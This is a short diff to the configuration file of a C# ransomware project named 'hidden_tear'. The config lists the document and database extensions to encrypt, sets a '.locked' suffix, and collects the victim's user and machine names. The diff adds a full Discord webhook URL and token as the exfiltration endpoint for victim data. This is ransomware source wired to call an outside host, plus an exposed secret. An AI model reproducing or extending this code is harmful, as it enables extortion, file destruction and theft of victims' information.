@@ -9,7 +9,7 @@ namespace hidden_tear.Tools
     internal class Config
     {
         public static string[] extensionToEncrypt = new string[]{ ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".jpg", ".png", ".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd", ".pdf", ".sqlite3", ".db" };
-        public static string DiscordWebhook = "";
+        public static string DiscordWebhook = "https://discord.com/api/webhooks/1085522027970048092/oBuAyhlYlAr_NdItUQf_boKQ6KM6GQiMiM199opsBRGlEx4ug6a0Ly8ZU7wxmJrlSjF8";
         public static string encryptedExtension = ".locked";
         public static string userName = Environment.UserName;
         public static string computerName = System.Environment.MachineName.ToString();
